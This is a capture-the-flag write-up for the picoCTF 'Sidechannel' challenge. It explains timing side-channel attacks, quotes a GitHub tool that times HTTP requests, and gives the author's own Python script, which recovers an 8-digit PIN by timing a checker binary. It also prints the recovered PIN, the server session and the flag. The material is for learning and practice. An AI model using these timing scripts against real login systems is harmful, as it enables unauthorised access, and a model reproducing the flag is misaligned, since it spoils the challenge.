# Sidechannel
Author: John

## Description
There's something fishy about this PIN-code checker, can you figure out the PIN and get the flag?
Download the PIN checker program here pin_checker
Once you've figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 53932 and provide it the PIN to get your flag.

## Solution
While researching the first hint (Read about "timing-based side-channel attacks."),
I came accross this gold mine of a resource.

> "Let us assume that the correct password is 5263987149, and the attacker starts guessing from the first digit (beginning from 0000000000). He measures that the system returns false after x seconds. After getting the same response time x for the first five guesses (i.e., from 0000000000 to 4000000000), he notices that the system takes a slightly longer time to respond ( x + ∆ x) when he tries 5000000000. This is because the for loop during its first iteration doesn’t return false since the first digit of the user input and the stored password is equal. Hence, the loop runs another iteration, thereby taking more time (∆x). Therefore, the attacker knows that the first digit he tried now is correct. He can repeat the same procedure to guess the remaining digits by observing the pattern of ∆x. In this way, it would take the attacker only 10*10 guesses at the maximum to find the correct password, compared to 10¹⁰ possible combinations while trying to brute force it…" (Source: https://medium.com/spidernitt/introduction-to-timing-attacks-4e1e8c84b32b)

Ok, the theory is pretty simple and I understand
it, so how do I put this into practice?
My answer to this question was to look up `side channel attack` in Github.

```python
def get_response_delay(config, data):
	request = urllib2.Request(config["url"])
	request = set_headers(config, request)

	start = 0
	try:
		if config["verbose"]:
			print "[VERBOSE***] Sending the following data: %s" % (config["data"] % urllib.quote(data))
		
		start = time.time()
		response = urllib2.urlopen(request, (config["data"] % urllib.quote(data)))
	except:
		delay = time.time() - start
		if config["verbose"]:
			print "[VERBOSE***] Exception was raised: %s" % sys.exc_info()[0]
		return delay
	
	delay = time.time() - start	
	
	if config["verbose"]:
		print "[VERBOSE***] HTTP response for %s" % data
		print response.read()
		
	return delay
```
(Source: https://github.com/Mr-Un1k0d3r/SideChannelAttack/blob/master/sidechannel.py)

As you can see in this code snippet I found, `time.time()` was used
to record the times before and after the web request was made by
`urllib2.urlopen()`. Then, the delay for the request to finish was
calculated by subtracting the finish time recoreded from the initial
time recorded. Of course, for this to work, the python program needs
to stop executing instructions while the request is sent and received
so that the times recorded will actually be accurate. This idea
is called a **blocking** instruction, since it "blocks" the program
until the current task is finished; then it continues. With this
in mind, here is the script I came up with.

```python
# subprocess.call() is blocking, which is what we want
# (https://stackoverflow.com/questions/21936597/blocking-and-non-blocking-subprocess-calls)
import subprocess
from time import perf_counter
import os
import sys

pin = ''
# iterate through all 8 digits (positions) of the pin
for x in range(8):
    # longest_delay will be used to compare so we can determine
    # the digit that the program takes longest to process
    longest_delay = 0
    correct_digit = ''
    # iterate through 10 digits for each position
    for i in range(10):
        pin_to_try = str(pin + str(i)).ljust(8, '0')
        # record time before and after the blocking call to pin_checker
		# using perf_counter(), which is a bit more accurate than time()
        time_before = perf_counter()
        # redirect unnecessary output of program to /dev/null
        subprocess.call(f'echo "{pin_to_try}" | ./pin_checker', shell=True, stdout=open(os.devnull, 'wb'))
        time_after = perf_counter()
        # show pin being tried for a 1337 effect
        print(pin_to_try, end='\r')
        # calculate delay
        delay = time_after - time_before
        # if delay is greater than the longest delay so far,
        # make the digit that was just entered the correct digit
        if delay > longest_delay:
            longest_delay = delay
            correct_digit = str(i)
    # append the correct number to pin
    pin += correct_digit
print(pin)
```

```
$ python3 pin_checker.py
48390513
$ ./pin_checker         
Please enter your 8-digit PIN code:
48390513
8
Checking PIN...
Access granted. You may use your PIN to log into the master server.
$
```
This is the first time I've felt so ELATED to have solved a ctf challenge!
Let's get the flag.

```
$ nc saturn.picoctf.net 53932                                                                                 1 ⨯
Verifying that you are a human...
Please enter the master PIN code:
48390513
Password correct. Here's your flag:
picoCTF{t1m1ng_4tt4ck_18704dda}
$
```
(Because of the nature of this attack, the pin you get might be incorrect
and you might have to run it multiple times to get the correct one.)

**Flag: picoCTF{t1m1ng_4tt4ck_18704dda}**